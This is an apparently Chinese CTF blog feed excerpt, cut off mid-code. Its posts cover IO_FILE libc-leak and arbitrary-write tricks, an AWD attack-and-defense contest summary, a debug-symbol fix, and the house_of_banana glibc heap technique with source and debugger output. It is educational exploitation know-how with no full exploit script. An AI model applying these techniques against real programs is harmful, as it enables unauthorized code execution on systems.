    <content type="html"><![CDATA[<h1 id="io-file的利用"><a href="#io-file的利用" class="headerlink" title="io_file的利用"></a>io_file的利用</h1><p>io_file的具体原理在前面已经搬运hollk师傅的文章了，所以就不写了，直接写下io_file的利用姿势</p><p>这里就是为了达到泄露libc最终需要调用的</p><p><code>_IO_do_write</code>函数三个参数分别为</p><p>stdout结构体，缓冲区基址，输出的size</p><p>如果将write_base改掉，就能泄露libc的目的了</p><p>具体的看这个文章</p><p><a href="https://le0f.github.io/2022/06/14/IO-FILE-leak/">https://le0f.github.io/2022/06/14/IO-FILE-leak/</a></p><h2 id="io-file泄露"><a href="#io-file泄露" class="headerlink" title="io_file泄露"></a>io_file泄露</h2><p><img src="https://s2.loli.net/2022/09/07/Ya72qUy91tuFEN6.png" alt="图片.png"></p><p>这里面关键的地方是_flags=0xfbad1800 ,_IO_read_ptr=0,_IO_read_end=0,_IO_read_base=0,_io_write_base最低位\x00,就可以泄露出libc了</p><p>也可以对_io_write_base直接进行修改，指向想要泄露的地址处，_io_write_ptr=指向的地址+0x8</p><h2 id="io-file任意写"><a href="#io-file任意写" class="headerlink" title="io_file任意写"></a>io_file任意写</h2><p>例如：修改_io_read_ptr-&gt;malloc_hook，io_read_end-&gt;malloc_hook+0x10，就可以任意往malloc_hook指针处写onegadget</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;io-file的利用&quot;&gt;&lt;a href=&quot;#io-file的利用&quot; class=&quot;headerlink&quot; title=&quot;io_file的利用&quot;&gt;&lt;/a&gt;io_file的利用&lt;/h1&gt;&lt;p&gt;io_file的具体原理在前面已经搬运hollk师傅的文章了，所以就不写了，</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>awd_pwn总结</title>
    <link href="http://wscyoulin.github.io/2022/09/04/awd_pwn%E6%80%BB%E7%BB%93/"/>
    <id>http://wscyoulin.github.io/2022/09/04/awd_pwn%E6%80%BB%E7%BB%93/</id>
    <published>2022-09-04T08:10:54.000Z</published>
    <updated>2022-09-04T08:35:12.306Z</updated>
    
    <content type="html"><![CDATA[<h1 id="bugku的一场awd自定义赛总结"><a href="#bugku的一场awd自定义赛总结" class="headerlink" title="bugku的一场awd自定义赛总结"></a>bugku的一场awd自定义赛总结</h1><h2 id="首先比赛方会给出自己队伍的靶机ip和ssh端口"><a href="#首先比赛方会给出自己队伍的靶机ip和ssh端口" class="headerlink" title="首先比赛方会给出自己队伍的靶机ip和ssh端口"></a>首先比赛方会给出自己队伍的靶机ip和ssh端口</h2><p><img src="https://s2.loli.net/2022/09/04/L9SfHEJ1urNa4Zo.png" alt="图片.png"></p><p>对于其他队伍会给出一个范围的网段（可以用nmap扫出来（不会），也可以用脚本扫出来（嫖了kento师傅的一个脚本））</p><h2 id="先用finalshell登上自己的靶机"><a href="#先用finalshell登上自己的靶机" class="headerlink" title="先用finalshell登上自己的靶机"></a>先用finalshell登上自己的靶机</h2><p><img src="https://s2.loli.net/2022/09/04/t1zbYpiGcSaZ9Wv.png" alt="图片.png"></p><p>登上之后是类似上面这张图片这样的，可以找到有一个pwn题(自己靶机的pwn题和别人靶机上的题目是一样的，除非别人进行了加固)，可以先下载下来并且顺便还可以查看一下靶机的libc版本（strings libc.so.6|grep GNU)切换到libc的目录看下对应的小版本都可以的。</p><h2 id="pwn进攻思路"><a href="#pwn进攻思路" class="headerlink" title="pwn进攻思路"></a>pwn进攻思路</h2><p>先写下对应pwn的exp（记得在自己的机器上patchelf一下对应的libc版本，不然容易出问题），然后确保本机可以打通后，切换对应的ip和端口去拿flag，对应的端口需要拿nmap扫描出来nmap -F ip（可以先扫自己的靶机，对应的端口是一样的）据说可以写批量攻击的脚本（但是不会，后面学会了再回来补充下）</p><h2 id="pwn防守思路"><a href="#pwn防守思路" class="headerlink" title="pwn防守思路"></a>pwn防守思路</h2><p>使用ida(keypatch插件)对一些明显的漏洞函数进行加固（修改），然后上传靶机可以直接覆盖掉之前的题目。</p><p>推荐看这个文章：<a href="https://baijiahao.baidu.com/s?id=1706950008032297634&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1706950008032297634&amp;wfr=spider&amp;for=pc</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;bugku的一场awd自定义赛总结&quot;&gt;&lt;a href=&quot;#bugku的一场awd自定义赛总结&quot; class=&quot;headerlink&quot; title=&quot;bugku的一场awd自定义赛总结&quot;&gt;&lt;/a&gt;bugku的一场awd自定义赛总结&lt;/h1&gt;&lt;h2 id=&quot;首先比赛方</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>debug信息修改</title>
    <link href="http://wscyoulin.github.io/2022/08/28/debug%E4%BF%A1%E6%81%AF%E4%BF%AE%E6%94%B9/"/>
    <id>http://wscyoulin.github.io/2022/08/28/debug%E4%BF%A1%E6%81%AF%E4%BF%AE%E6%94%B9/</id>
    <published>2022-08-28T14:02:58.000Z</published>
    <updated>2022-08-28T14:10:59.491Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记录一个pwn常用技巧-修改debug"><a href="#记录一个pwn常用技巧-修改debug" class="headerlink" title="记录一个pwn常用技巧-修改debug"></a>记录一个pwn常用技巧-修改debug</h1><p>一般来说是用在本身提供的pwn题已经patchelf好了libc，并且将ld和libc.so.6都已经提供。但是如果本身虚拟机的版本和题目的版本不一样，那么调试的时候会看不了堆块啥的</p><h2 id="首先需要先将ld和libc-so-6给权限"><a href="#首先需要先将ld和libc-so-6给权限" class="headerlink" title="首先需要先将ld和libc.so.6给权限"></a>首先需要先将ld和libc.so.6给权限</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 libc.so.6</span><br><span class="line">chmod 777 ld-linux-x86-64.so.2</span><br></pre></td></tr></tbody></table></figure><h2 id="然后在glibc-all-in-one里面找到对应的libc版本"><a href="#然后在glibc-all-in-one里面找到对应的libc版本" class="headerlink" title="然后在glibc all in one里面找到对应的libc版本"></a>然后在glibc all in one里面找到对应的libc版本</h2><p>在debs里面找到这个.build-id（注意是个隐藏文件）</p><p>将他提取到主目录</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/lib/debug</span><br><span class="line">sudo mv .build-id/ .build-id.bak</span><br><span class="line">cd ~</span><br><span class="line">sudo mv ~/.build-id/ /usr/lib/debug</span><br></pre></td></tr></tbody></table></figure><p>现在就可以正常调试pwn题了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;记录一个pwn常用技巧-修改debug&quot;&gt;&lt;a href=&quot;#记录一个pwn常用技巧-修改debug&quot; class=&quot;headerlink&quot; title=&quot;记录一个pwn常用技巧-修改debug&quot;&gt;&lt;/a&gt;记录一个pwn常用技巧-修改debug&lt;/h1&gt;&lt;p&gt;一般</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>house_of_banana</title>
    <link href="http://wscyoulin.github.io/2022/08/22/house-of-banana/"/>
    <id>http://wscyoulin.github.io/2022/08/22/house-of-banana/</id>
    <published>2022-08-22T08:21:13.000Z</published>
    <updated>2022-08-24T14:45:14.211Z</updated>
    
    <content type="html"><![CDATA[<h1 id="新版glibc的改进"><a href="#新版glibc的改进" class="headerlink" title="新版glibc的改进"></a>新版glibc的改进</h1><p>从glibc 2.28开始，增加了对unsorted bin的bk检验，使得unsorted bin attack不再可以使用</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/* remove from unsorted list */</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr ("malloc(): corrupted unsorted chunks 3");</span><br></pre></td></tr></tbody></table></figure><p>此时，我们可以考虑使用large bin attack，使用house of strom实现任意地址分配；然而，从glibc2.29开始，检查变得更加严格，house of strom不能用了</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if (__glibc_unlikely (size &lt;= 2 * SIZE_SZ)</span><br><span class="line">    || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr ("malloc(): invalid size (unsorted)");</span><br><span class="line">if (__glibc_unlikely (chunksize_nomask (next) &lt; 2 * SIZE_SZ)</span><br><span class="line">    || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr ("malloc(): invalid next size (unsorted)");</span><br><span class="line">if (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">  malloc_printerr ("malloc(): mismatching next-&gt;prev_size (unsorted)");</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">    || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">  malloc_printerr ("malloc(): unsorted double linked list corrupted");</span><br><span class="line">if (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">  malloc_printerr ("malloc(): invalid next-&gt;prev_inuse (unsorted)");</span><br></pre></td></tr></tbody></table></figure><p>但是幸运的是large bin attack仍然可以使用</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long) size</span><br><span class="line">          == (unsigned long) chunksize_nomask (fwd))</span><br><span class="line">                    /* Always insert in the second position.  */</span><br><span class="line">                    fwd = fwd-&gt;fd;</span><br><span class="line">                  else</span><br><span class="line">                    {</span><br><span class="line">                      victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                      victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    }</span><br><span class="line">                  bck = fwd-&gt;bk;</span><br></pre></td></tr></tbody></table></figure><p>然而从glibc 2.30开始，常规large bin attack方法也被封堵</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long) size</span><br><span class="line">            == (unsigned long) chunksize_nomask (fwd))</span><br><span class="line">                      /* Always insert in the second position.  */</span><br><span class="line">                      fwd = fwd-&gt;fd;</span><br><span class="line">                    else</span><br><span class="line">                      {</span><br><span class="line">                        victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                        if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                          malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");</span><br><span class="line">                        fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                      }</span><br><span class="line">                    bck = fwd-&gt;bk;</span><br><span class="line">                    if (bck-&gt;fd != fwd)</span><br><span class="line">                      malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");</span><br></pre></td></tr></tbody></table></figure><h2 id="0x03-large-bin-attack在新版glibc中的利用"><a href="#0x03-large-bin-attack在新版glibc中的利用" class="headerlink" title="0x03 large bin attack在新版glibc中的利用"></a>0x03 large bin attack在新版glibc中的利用</h2><p>那是否意味着large bin attack不能用了呢，其实不是，以前的large bin attack手法，都是在下面第二个分支里进行</p><p><img src="https://p3.ssl.qhimg.com/t011197cbed4f5d1848.png" alt="img"></p><p>在最新版的glibc 2.32里，我们看到，第二个分支里确实封堵了以前的利用手法，但是在第一个分支里，仍然可以实现large bin attack，但是该分支利用起来，只是完成<strong>往任意地址写一个堆地址</strong>的作用，因为这里的<code>bck-&gt;bk</code>才是我们的large bin，因此分析来看，我们能够控制的也就是图中第一个分支中的<code>fwd-&gt;fd-&gt;bk_nextsize</code>，而完成写的操作是在<code>fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code> 这句中，即可以往任意地址写上这个unsorted bin chunk堆的地址。而以前旧版large bin attack是可以往<strong>任意的两个地址写两个堆地址</strong>。（摘抄自安全客）</p><h1 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h1><h3 id="适用场景（满足任一条件即可）："><a href="#适用场景（满足任一条件即可）：" class="headerlink" title="适用场景（满足任一条件即可）："></a>适用场景（满足任一条件即可）：</h3><h4 id="1-程序能够显式的执行exit函数"><a href="#1-程序能够显式的执行exit函数" class="headerlink" title="1.程序能够显式的执行exit函数"></a>1.程序能够显式的执行exit函数</h4><h4 id="2-程序通过libc-start-main启动的主函数，且主函数能够结束"><a href="#2-程序通过libc-start-main启动的主函数，且主函数能够结束" class="headerlink" title="2.程序通过libc_start_main启动的主函数，且主函数能够结束"></a>2.程序通过libc_start_main启动的主函数，且主函数能够结束</h4><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>在ld.so里，存在一个_rtld_global指针，指向rtld_global结构体</p><p><img src="https://p0.ssl.qhimg.com/t01b23a2bb2487c3f57.png" alt="img"></p><p>该结构体较为复杂</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">struct rtld_global</span><br><span class="line">{</span><br><span class="line">#endif</span><br><span class="line">  /* Don't change the order of the following elements.  'dl_loaded'</span><br><span class="line">     must remain the first element.  Forever.  */</span><br><span class="line"></span><br><span class="line">/* Non-shared code has no support for multiple namespaces.  */</span><br><span class="line">#ifdef SHARED</span><br><span class="line"># define DL_NNS 16</span><br><span class="line">#else</span><br><span class="line"># define DL_NNS 1</span><br><span class="line">#endif</span><br><span class="line">  EXTERN struct link_namespaces</span><br><span class="line">  {</span><br><span class="line">    /* A pointer to the map for the main map.  */</span><br><span class="line">    struct link_map *_ns_loaded;</span><br><span class="line">    /* Number of object in the _dl_loaded list.  */</span><br><span class="line">    unsigned int _ns_nloaded;</span><br><span class="line">    /* Direct pointer to the searchlist of the main object.  */</span><br><span class="line">    struct r_scope_elem *_ns_main_searchlist;</span><br><span class="line">    /* This is zero at program start to signal that the global scope map is</span><br><span class="line">       allocated by rtld.  Later it keeps the size of the map.  It might be</span><br><span class="line">       reset if in _dl_close if the last global object is removed.  */</span><br><span class="line">    unsigned int _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">    /* During dlopen, this is the number of objects that still need to</span><br><span class="line">       be added to the global scope map.  It has to be taken into</span><br><span class="line">       account when resizing the map, for future map additions after</span><br><span class="line">       recursive dlopen calls from ELF constructors.  */</span><br><span class="line">    unsigned int _ns_global_scope_pending_adds;</span><br><span class="line"></span><br><span class="line">    /* Once libc.so has been loaded into the namespace, this points to</span><br><span class="line">       its link map.  */</span><br><span class="line">    struct link_map *libc_map;</span><br><span class="line"></span><br><span class="line">    /* Search table for unique objects.  */</span><br><span class="line">    struct unique_sym_table</span><br><span class="line">    {</span><br><span class="line">      __rtld_lock_define_recursive (, lock)</span><br><span class="line">      struct unique_sym</span><br><span class="line">      {</span><br><span class="line">    uint32_t hashval;</span><br><span class="line">    const char *name;</span><br><span class="line">    const ElfW(Sym) *sym;</span><br><span class="line">    const struct link_map *map;</span><br><span class="line">      } *entries;</span><br><span class="line">      size_t size;</span><br><span class="line">      size_t n_elements;</span><br><span class="line">      void (*free) (void *);</span><br><span class="line">    } _ns_unique_sym_table;</span><br><span class="line">    /* Keep track of changes to each namespace' list.  */</span><br><span class="line">    struct r_debug _ns_debug;</span><br><span class="line">  } _dl_ns[DL_NNS];</span><br><span class="line">  /* One higher than index of last used namespace.  */</span><br><span class="line">  EXTERN size_t _dl_nns;</span><br><span class="line">.................................................................................</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>其中可以看到里面有多个<code>_dl_ns</code>结构体，调试发现，该结构体存储着的实际就是elf各段的符号结构体</p><p><img src="https://p2.ssl.qhimg.com/t014a1a2df2f9476720.png" alt="img"></p><p>，类似于IDA中的段结构体</p><p><img src="https://p0.ssl.qhimg.com/t017312b35952d01ad7.png" alt="img"></p><p>我们较为关注的是fini_array段的动态链接结构体指针</p><p><img src="https://p1.ssl.qhimg.com/t012462ff5820e0e81b.png" alt="img"></p><p>该结构体实际在在_dl_fini中被使用</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)</span><br><span class="line">{</span><br><span class="line">  ElfW(Addr) *array =</span><br><span class="line">    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">            + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">  unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">            / sizeof (ElfW(Addr)));</span><br><span class="line">  while (i-- &gt; 0)</span><br><span class="line">    ((fini_t) array[i]) ();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>汇编中对应的代码如下</p><p><img src="https://p2.ssl.qhimg.com/t018e401caf62becc99.png" alt="img"></p><p>因此，伪造该结构体指针，可以使得array指向我们可控的数据区，从而布置下一系列函数，进而劫持程序的流，那么house of  banana的思想就是利用large bin  attack往rtld_global写入堆的地址，并事先在堆里伪造好rtld_global结构体，这样程序exit或者正常退出main函数时，便会执行到伪造的fini_array数组。</p><p>知乎摘抄：</p><h2 id="house-of-banana-1"><a href="#house-of-banana-1" class="headerlink" title="house of banana"></a>house of banana</h2><p>house of banana 是ha1vk师傅在2020年总结出来的利用链。不同于IO_str_finish和IO_str_overflow利用，banana攻击的是_rtld_global结构体中的link_map链表。</p><p>攻击的位置houm是在程序结束后调用exit，或者程序由libc_start_main启动，并且主函数可以正常结束返回。（这里提到了exit，不得不提一下以往的攻击exit_hook，配合onegadget获得shell，目前为止，到glibc2.34ubuntu3依旧可以利用，但是在3.2版本下该地址没有了可写权限，所以失效了）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//2.34 0ubuntu3.2</span><br><span class="line">RAX  0x1</span><br><span class="line"> RBX  0x7ffff7fad9f8 (__elf_set___libc_atexit_element__IO_cleanup__) —▸ 0x7ffff7e26b10 (_IO_cleanup) ◂— endbr64 </span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x1</span><br><span class="line"> RDI  0x555555558148 ◂— 0x0</span><br><span class="line">```</span><br><span class="line">0x7ffff7ddd58f &lt;__run_exit_handlers+431&gt;    nop    </span><br><span class="line"> ► 0x7ffff7ddd590 &lt;__run_exit_handlers+432&gt;    call   qword ptr [rbx]               &lt;_IO_cleanup&gt;</span><br><span class="line">        rdi: 0x555555558148 ◂— 0x0</span><br><span class="line">        rsi: 0x0</span><br><span class="line">        rdx: 0x1</span><br><span class="line">        rcx: 0x0</span><br><span class="line">```</span><br><span class="line">pwndbg&gt; vmmap 0x7ffff7fad9f8</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x7ffff7fad000     0x7ffff7fb1000 r--p     4000 214000 /usr/lib/x86_64-linux-gnu/libc.so.6 +0x9f8</span><br><span class="line">pwndbg&gt; x 0x7ffff7fad9f8</span><br><span class="line">0x7ffff7fad9f8 &lt;__elf_set___libc_atexit_element__IO_cleanup__&gt;: 0xf7e26b10</span><br></pre></td></tr></tbody></table></figure><p>house  of banana  相较于以往的攻击手法，其实思路很明确。在程序通过显式调用exit，或者main函数是由__libc_start_main唤起，并可以正常的返回时，由于动态链接的加载机制，程序中并没有exit函数的真实调用，而是要通过符号表来获得真实的函数地址。（有关动态链接延迟绑定的技术，还请自行查阅，这里不做过多的阐述。）我们联想到ret2_dl_resolve技术。</p><p>下面是exit执行的一个过程</p><h2 id="exit-gt-dl-fini-gt-fini-t-array-i"><a href="#exit-gt-dl-fini-gt-fini-t-array-i" class="headerlink" title="exit -> _dl_fini ->((fini_t) array[i]) ();"></a>exit -&gt; _dl_fini -&gt;((fini_t) array[i]) ();</h2><p>banana手法，通过伪造修改相关的表项，以达到调用后门来获得权限。这里我们重点说一下，在ubuntu3.2下利用的可行性。大多数师傅对于banana的攻击方式主要有两种，一是攻击_rtld_global这个全局符号所保存的link_map的链表。伪造整个链表，进行劫持。相关的全局变量是可以写的。后面会解释这个变量的用处。</p><p><img src="https://pic1.zhimg.com/80/v2-aa81caf3ce7fdb69e7aabdb0155b2658_1440w.png" alt="img"></p><p>另外一个与之相比破坏性比较小，更容易成功。由于link_map通过链表链接，但是在加载exit的时候，相关函数只会通过link_map-&gt;l_next指针进行相关的检查。我们可以在某个特定的位置，更改next指针，将下一以链表节点转为我们控制的地方，比如heap上。</p><p>很多朋友看了上面的可能会比较蒙，下面我具体说一参数。</p><p>关于link_map,我们攻击exit时，会使用到一个link_map 的链表，链表的一些信息保存在struct rtld_global结构体中，这个结构体信息很多，很繁杂，但是banana只用到了几个关键的点。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;_rtld_global</span><br><span class="line">$1 = (struct rtld_global *) 0x7f56e43b9040 &lt;_rtld_global&gt;</span><br><span class="line">    //以下是结构体信息的展开，pwndbg为我们做了整理</span><br><span class="line">pwndbg&gt; p _rtld_global</span><br><span class="line">$2 = {</span><br><span class="line">  _dl_ns = {{</span><br><span class="line">      _ns_loaded = 0x7f56e43ba220,    //#1</span><br><span class="line">      _ns_nloaded = 4,      //#2</span><br><span class="line">      _ns_main_searchlist = 0x7f56e43ba4e0,</span><br><span class="line">      _ns_global_scope_alloc = 0,</span><br><span class="line">      _ns_global_scope_pending_adds = 0,</span><br><span class="line">      libc_map = 0x7f56e4382000,</span><br><span class="line">      _ns_unique_sym_table = {</span><br><span class="line">        lock = {</span><br><span class="line">          mutex = {</span><br><span class="line">            __data = {</span><br><span class="line">              __lock = 0,</span><br><span class="line">              __count = 0,</span><br><span class="line">              __owner = 0,</span><br><span class="line">              __nusers = 0,</span><br><span class="line">              __kind = 1,</span><br><span class="line">              __spins = 0,</span><br><span class="line">              __elision = 0,</span><br><span class="line">              __list = {</span><br><span class="line">                __prev = 0x0,</span><br><span class="line">                __next = 0x0</span><br><span class="line">              }</span><br><span class="line">            },</span><br><span class="line">            __size = '\000' &lt;repeats 16 times&gt;, "\001", '\000' &lt;repeats 22 times&gt;,</span><br><span class="line">            __align = 0</span><br><span class="line">          }</span><br><span class="line">....    </span><br><span class="line">  //展开数据会很多，但是只是对链表个节点信息的汇总</span><br></pre></td></tr></tbody></table></figure><p>我们需要关注的是，</p><p>#1，_ns_loaded = 0x7f56e43ba220, 这是整个链表的头节点，</p><p>#2， _ns_nloaded = 4, 这里知名个这个链表的节点个数，在exit后面加载的检查中，会要求_ns_nloaded链表的节点不少于3个</p><p>（后面我会给出相关的源码）</p><p>然后对于每个节点，都是link_map结构体，我们利用第一个节点做一下简单说明(省略了部分无关的数据)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct link_map *)0x7f56e43ba220</span><br><span class="line">$3 = {</span><br><span class="line">  l_addr = 94172888551424,</span><br><span class="line">  l_name = 0x7f56e43ba7c8 "",</span><br><span class="line">  l_ld = 0x55a655922000,</span><br><span class="line">  l_next = 0x7f56e43ba7d0,   //#3</span><br><span class="line">  l_prev = 0x0,       </span><br><span class="line">  l_real = 0x7f56e43ba220,   //#3</span><br><span class="line">  l_ns = 0,</span><br><span class="line">  l_libname = 0x7f56e43ba7b0,</span><br><span class="line">  l_info = {0x0, 0x55a655922010, 0x55a6559220f0, 0x55a6559220e0, 0x0, 0x55a655922090, 0x55a6559220a0, 0x55a655922120, 0x55a655922130, 0x55a655922140, 0x55a6559220b0, 0x55a6559220c0, 0x55a655922020, 0x55a655922030, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x55a655922100, 0x55a6559220d0, 0x0, 0x55a655922110, 0x55a655922160, 0x55a655922040, 0x55a655922060, 0x55a655922050, 0x55a655922070, 0x55a655922000, 0x55a655922150, 0x0, 0x0, 0x0, 0x0, 0x55a655922180, 0x55a655922170, 0x0, 0x0, 0x55a655922160, 0x0, 0x55a6559221a0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x55a655922190, 0x0 &lt;repeats 25 times&gt;, 0x55a655922080},   //#4</span><br><span class="line">  l_phdr = 0x55a65591d040,</span><br><span class="line">......</span><br><span class="line">  l_direct_opencount = 1,</span><br><span class="line">  l_type = lt_executable,</span><br><span class="line">  l_relocated = 1,</span><br><span class="line">  l_init_called = 1,     //#5</span><br><span class="line">  l_global = 1,</span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>我们需要关注的：</p><p>#3，l_next = 0x7f56e43ba7d0, ，指向下一个link_map 的指针，我们就是通过修改这个，将下一个节点劫持为我们伪造的link_map</p><p>#4 , l_real = 0x7f56e43ba220 ,,指向的的自身的地址，这里也是后面需要检查的地方。</p><p>#5, l_init_called = 1,简单说，就是为了绕过检查。</p><p>下面是_dl_fini函数的源码（我已经删除了部分注释及代码，源码路径为glibc2.34/elf/dl-fini.c）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 